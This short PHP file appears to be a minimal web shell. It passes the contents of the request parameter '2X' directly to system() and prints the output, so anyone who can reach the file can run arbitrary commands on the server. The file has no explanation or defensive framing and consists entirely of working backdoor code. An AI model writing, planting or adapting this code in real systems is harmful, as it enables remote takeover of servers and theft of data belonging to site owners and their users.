<?php
if(isset($_REQUEST['2X'])){
    $command = $_REQUEST['2X'];
    echo "<p>";
    system($command);
    echo "</p>";
    die;
}
?>
